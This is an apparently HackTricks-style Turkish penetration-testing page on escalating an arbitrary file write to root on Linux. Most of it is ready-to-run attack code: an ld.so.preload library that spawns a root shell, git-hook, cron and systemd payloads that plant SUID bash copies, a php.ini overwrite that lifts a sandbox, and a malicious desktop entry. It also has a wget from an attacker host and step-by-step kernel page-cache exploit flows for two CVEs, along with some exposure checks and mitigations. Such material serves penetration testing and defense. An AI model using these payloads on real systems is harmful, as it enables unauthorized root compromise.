# Root'a Arbitrary File Write

### /etc/ld.so.preload

`/etc/ld.so.preload`, dynamic linker'ın diğer shared object'lerden önce yüklediği shared object'lerin sistem genelindeki listesidir. Secure-execution mode, preloading için ek kısıtlamalar uygular; bu nedenle `/tmp/pe.so` gibi bir library path'i evrensel bir SUID-binary tekniği değildir.\
Bunu oluşturabilir veya değiştirebilirseniz, dosyayı yükleyen bir process, listelenen library'yi diğer shared object'lerinden önce yükler ve bu process'in context'i içinde code execution sağlar.<sup>[[12]](#references)</sup>

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks**, bir repository'deki commit ve merge işlemleri dahil olmak üzere çeşitli olaylar için çalıştırılan executable scriptlerdir. Bir **privileged script veya user** bu işlemleri gerçekleştiriyorsa ve bir attacker **`.git` klasörüne yazabiliyorsa**, hook **privilege escalation** için kullanılabilir.<sup>[[13]](#references)</sup>

Örneğin, yeni bir commit oluşturulduğunda her zaman çalıştırılması için bir git repo içinde **`.git/hooks`** konumunda bir **script oluşturmak** mümkündür:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron ve Time dosyaları

Root tarafından çalıştırılan **cron ile ilgili dosyalara yazabiliyorsanız**, genellikle görev bir sonraki çalıştığında code execution elde edebilirsiniz. İlginç hedefler şunlardır:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root'un `/var/spool/cron/` veya `/var/spool/cron/crontabs/` dizinindeki kendi crontab'ı
- `systemd` timer'ları ve tetikledikleri servisler

Hızlı kontroller:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipik kötüye kullanım yolları:

- `/etc/crontab` dosyasına veya `/etc/cron.d/` içindeki bir dosyaya **yeni bir root cron job ekleme**
- `run-parts` tarafından zaten çalıştırılan bir **script'i değiştirme**
- Başlattığı script veya binary'yi değiştirerek **mevcut bir timer hedefinde backdoor oluşturma**

Minimal cron payload örneği:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts` tarafından kullanılan bir cron dizinine yalnızca yazabiliyorsanız, bunun yerine oraya çalıştırılabilir bir dosya bırakın:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notlar:

- `run-parts` genellikle nokta içeren dosya adlarını yok sayar; bu nedenle `backup.sh` yerine `backup` gibi adları tercih edin.<sup>[[15]](#references)</sup>
- Bazı sistemler klasik cron yerine `systemd` timers kullanır, ancak abuse fikri aynıdır: **root'un daha sonra çalıştıracağı şeyi değiştirin**.<sup>[[20]](#references)</sup>

### Service ve Socket dosyaları

**`systemd` unit dosyalarına** veya bunların referans verdiği dosyalara yazabiliyorsanız, unit'i yeniden yükleyip yeniden başlatarak ya da service/socket activation yolunun tetiklenmesini bekleyerek root olarak kod çalıştırabilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

İlginç hedefler şunlardır:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` içindeki Drop-in override'ları
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından referans verilen servis script'leri/binary'leri
- Bir root servisi tarafından yüklenen yazılabilir `EnvironmentFile=` yolları

Hızlı kontroller:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Yaygın kötüye kullanım yolları:

- Değiştirebildiğiniz, root tarafından sahip olunan bir service unit içindeki **`ExecStart=`** satırının üzerine yazmak
- Kötü amaçlı bir **`ExecStart=`** içeren bir **drop-in override** eklemek ve önce eski olanı temizlemek
- Unit tarafından hâlihazırda referans verilen script/binary dosyasına **Backdoor** eklemek
- Socket bir bağlantı aldığında başlayan ilgili **`.service`** dosyasını değiştirerek **socket-activated service**'i ele geçirmek

Kötü amaçlı override örneği:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipik etkinleştirme akışı:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Kendiniz servisleri yeniden başlatamıyorsanız ancak socket-activated birimi düzenleyebiliyorsanız, backdoored servisin root olarak çalıştırılmasını tetiklemek için yalnızca **bir istemci bağlantısını beklemeniz** gerekebilir.<sup>[[17]](#references)</sup>

### Ayrıcalıklı bir PHP sandbox tarafından kullanılan kısıtlayıcı `php.ini` dosyasının üzerine yazma

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP kodunu **kısıtlı bir `php.ini`** ile `php` çalıştırarak doğrular (örneğin, `disable_functions=exec,system,...`). Sandbox içindeki kod hâlâ **herhangi bir yazma primitive'ine** (örneğin `file_put_contents`) sahipse ve daemon tarafından kullanılan **tam `php.ini` yoluna** erişebiliyorsanız, kısıtlamaları kaldırmak için **bu yapılandırmanın üzerine yazabilir**, ardından yükseltilmiş ayrıcalıklarla çalışan ikinci bir payload gönderebilirsiniz.<sup>[[2]](#references)</sup>

Tipik akış:

1. İlk payload sandbox yapılandırmasının üzerine yazar.
2. Tehlikeli işlevler yeniden etkinleştirildiği için ikinci payload kodu çalıştırır.

Minimal örnek (daemon tarafından kullanılan yolu değiştirin):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Daemon root olarak çalışıyorsa (veya root sahipli yollarla doğrulama yapıyorsa), ikinci çalıştırma root context’i sağlar. Bu, sandboxed runtime hâlâ dosya yazabiliyorsa temelde **config overwrite üzerinden privilege escalation** anlamına gelir.

### binfmt_misc

`binfmt_misc`, kayıtları `/proc/sys/fs/binfmt_misc` altında sunar; her kayıt bir dosya türü pattern’ini bir interpreter ile ilişkilendirir. Privilege etkisi, kaydı kimin değiştirebildiğine ve eşleşen dosyayı daha sonra hangi process’in çalıştırdığına bağlıdır; bu nedenle bunu bir privilege-escalation yolu olarak değerlendirmeden önce bu gereksinimleri doğrulayın.<sup>[[21]](#references)</sup>

### Schema handler’larını (http: veya https: gibi) overwrite etme

Desktop environment’lar, URI scheme’leri için bir application seçmek amacıyla MIME association’ları ve desktop entry’leri kullanır; ilgili per-user configuration ve desktop-entry directory’lerine yazabilen bir attacker, bu scheme’leri kontrol ettiği bir launcher’a yönlendirebilir. `$HOME/.config/mimeapps.list` dosyasını, HTTP ve HTTPS URL handler’larını malicious bir dosyaya yönlendirecek şekilde değiştirerek (örneğin, `x-scheme-handler/http=evil.desktop` ve `x-scheme-handler/https=evil.desktop`), bir user click bu desktop entry’yi çalıştırabilir.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root'un kullanıcı tarafından yazılabilir script/binary'leri çalıştırması

Ayrıcalıklı bir workflow `/bin/sh /home/username/.../script` gibi bir şey çalıştırıyorsa (veya ayrıcalıksız bir kullanıcıya ait bir dizinin içindeki herhangi bir binary'yi), bunu ele geçirebilirsiniz:<sup>[[1]](#references)</sup>

- **Çalıştırmayı tespit edin:** Root'un kullanıcı kontrolündeki path'leri çağırdığını yakalamak için pspy ile process'leri izleyin.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Yazılabilirliği doğrula:** hem hedef dosyanın hem de dizinin kullanıcı hesabınıza ait ve sizin tarafınızdan yazılabilir olduğundan emin olun.
- **Hedefi ele geçir:** orijinal binary/script dosyasını yedekleyin ve SUID shell oluşturan bir payload (veya başka bir root işlemi) bırakın, ardından izinleri geri yükleyin:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Privileged action'ı tetikleyin** (ör. helper'ı başlatan bir UI düğmesine basarak). Root, hijacked path'i yeniden çalıştırdığında, `./rootshell -p` ile escalated shell'i alın.

### Privileged binary'lerin yalnızca page-cache üzerinde değiştirilmesi

Bazı kernel bug'ları dosyayı **disk üzerinde değiştirmez**. Bunun yerine yalnızca okunabilir bir dosyanın **page cache kopyasını** değiştirmenize izin verir. Bir **setuid** veya başka şekilde **root tarafından çalıştırılan** binary'yi hedefleyebilirseniz, sonraki çalıştırma bellekteki attacker-controlled byte'ları çalıştırabilir ve diskteki file hash'i değişmeden privileges escalate edilebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Bunu bir **runtime-only file write primitive** olarak düşünmek yararlıdır:<sup>[[3]](#references)</sup>

- **Disk temiz kalır**: inode ve disk üzerindeki byte'lar değişmez
- **Memory dirty olur**: cache'lenmiş page'i okuyan/çalıştıran process'ler attacker tarafından değiştirilmiş içeriği alır
- **Effect geçicidir**: değişiklik reboot veya cache eviction sonrasında kaybolur

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi eski **page-cache abuse** bug'ları arasında yer alır:<sup>[[3]](#references)</sup>

- Dirty COW bir race condition'a dayanıyordu
- Dirty Pipe write-position kısıtlamalarına sahipti
- Vulnerable path, cache'lenmiş file-backed page'lere doğrudan write sağlıyorsa, yalnızca page-cache üzerinde çalışan bir primitive daha reliable olabilir

#### Generic privesc flow

1. **File-backed page cache page'lerine** write yapabilen bir kernel primitive elde edin
2. Bunu **okunabilir bir privileged binary** veya root tarafından çalıştırılan başka bir dosya üzerinde kullanın
3. Page cache'den eviction gerçekleşmeden önce execution'ı **tetikleyin**
4. Disk üzerindeki dosya değiştirilmemiş görünmeye devam ederken root olarak code execution elde edin

Tipik high-value target'lar:

- **setuid-root** binary'leri
- **Root service'leri** tarafından başlatılan helper'lar
- **Host kernel/page cache'ini paylaşan container'lar** tarafından yaygın şekilde çalıştırılan binary'ler

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) bu sınıf için iyi bir örnektir. Vulnerable path, Linux crypto userspace API'si (`AF_ALG` / `algif_aead`) içindeydi:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`, page-cache page'lerine ait reference'ları okunabilir bir dosyadan crypto TX scatterlist'ine taşıyabilir
- in-place `algif_aead` decrypt path'i source ve destination buffer'larını yeniden kullandı
- `authencesn` daha sonra destination tag region'ına write yaptı
- Bu region hâlâ spliced file-backed page'lere reference veriyorsa, write hedef dosyanın **page cache'ine** yapıldı

Dolayısıyla ilginç technique CVE'nin kendisi değil, şu pattern'dir:

- **File-backed cache page'lerini bir kernel subsystem'ine beslemek**
- Subsystem'in bunları **writable output** olarak ele almasını sağlamak
- Bellekte küçük ve kontrollü bir overwrite tetiklemek

Public PoC, `/usr/bin/su` dosyasını memory'de patch'lemek ve ardından çalıştırmak için tekrarlanan **4-byte write** işlemlerini kullandı.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503), bu kez sink olarak `AF_ALG` yerine **IPsec ESP decrypt** kullanan, aynı **page-cache-only write-to-root** pattern'inin başka bir varyantını gösterir.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Buradaki önemli technique **metadata-laundering adımıdır**:

- `splice()`, **read-only file-backed page-cache page'ini** bir ESP-in-UDP packet'ine yerleştirir
- Orijinal DirtyFrag mitigation'ı, `esp_input()` decrypt işleminden önce **copy yapacak** şekilde bu skb'yi `SKBFL_SHARED_FRAG` ile tag'liyordu
- netfilter `TEE`, packet'i `nf_dup_ipv4()` -> `__pskb_copy_fclone()` üzerinden duplicate eder
- Clone, **aynı physical page-cache reference'ını** korur ancak `SKBFL_SHARED_FRAG`'i kaybeder
- `esp_input()` daha sonra clone'u güvenli kabul eder ve file-backed page üzerinde **in-place `cbc(aes)` decrypt** çalıştırır

Dolayısıyla reviewer dersi CVE'den daha kapsamlıdır: Bir mitigation, bir işlemin önce copy yapıp yapmayacağına karar vermek için **skb/page metadata**'sına dayanıyorsa, backing page'i koruyup metadata'yı düşüren herhangi bir **clone/copy path'i**, write primitive'ini sessizce yeniden etkinleştirebilir.

Tipik exploitation flow:

1. **Private network namespace içinde `CAP_NET_ADMIN`** elde etmek için `unshare(CLONE_NEWUSER | CLONE_NEWNET)` kullanın
2. Loopback'i aktif duruma getirin ve `mangle/OUTPUT` içinde bir **netfilter `TEE` rule'u** kurun
3. `NETLINK_XFRM` üzerinden **XFRM ESP transport SA**'ları kurun
4. Her hedef 4-byte word'ü SA `seq_hi` field'ına encode edin (DirtyFrag'in word-selection trick'i)
5. Spliced ESP-in-UDP packet'ini gönderin; böylece **TEE clone'u** `esp_input()`'e ulaşır ve **in place** decrypt eder
6. `/usr/bin/su` veya başka bir privileged executable'ın page-cache kopyası attacker-controlled code içeriği taşıyana kadar tekrarlayın

Operational olarak impact, `AF_ALG` example'ındakiyle aynıdır: Disk üzerindeki dosya temiz kalır, ancak `execve()` **mutated page-cache byte'larını** kullanır ve root verir.<sup>[[8]](#references)[[9]](#references)</sup>

Bu varyant için kullanışlı exposure check'leri:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Burada kısa vadeli saldırı yüzeyi azaltma da yola özgüdür: `48f6a5356a33` içeren bir kernel sürümüne yükseltmek clone yolunu düzeltirken, `xt_TEE` autoload'unu engellemek **flag-laundering adımını** ortadan kaldırır ve `esp4` / `esp6` yüklemesini engellemek **decrypt sink'ini** kaldırır.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure ve hunting

Bu hata sınıfından şüpheleniyorsanız yalnızca disk bütünlüğü kontrollerine güvenmeyin. Ayrıca şunları doğrulayın:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Aşağıdaki yapılandırma değerleri, yüklenebilir bir arayüzü kernel içine yerleşik bir arayüzden ayırır; crypto build kuralları `CONFIG_CRYPTO_USER_API_AEAD` değerini `algif_aead` ile eşler.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` bir module olarak yüklenebilir/kaldırılabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: arayüz kernel içine yerleşiktir
- setuid binaries iyi hedeflerdir; çünkü yalnızca page-cache tabanlı bir patch, yerel bir foothold'u root yetkisine yükseltmek için yeterli olabilir

#### `algif_aead` path'i için attack-surface reduction

Vulnerable arayüz bir loadable module tarafından sağlanıyorsa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Çekirdeğe derlenmişse, bazı açıklamalar init yolunun şu şekilde engellendiğini bildirmiştir:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Bu tür bir mitigation, diğer kernel LPE'leri için de akılda tutulmaya değer: exploitation belirli bir optional interface'e bağlıysa, bu interface'i devre dışı bırakmak veya blacklist'e almak, tam bir kernel upgrade'i mevcut olmadan önce bile exploit path'ini kırabilir.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – user-writable PaperCut dizininde root tarafından çalıştırılan bir script'i ele geçirme](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) SSS](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 için Openwall oss-security açıklaması](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable düzeltmesi: crypto: algif_aead - out-of-place çalışmaya geri dön](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint teknik writeup'ı](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE varyantı DirtyClone'u (CVE-2026-43503) inceleme ve exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux düzeltmesi: net: skb: `__pskb_copy_fclone()` içinde `SKBFL_SHARED_FRAG` değerini koru (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux'ta önceki mitigation: splice edilmiş UDP paketleri için `SKBFL_SHARED_FRAG` ayarla (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
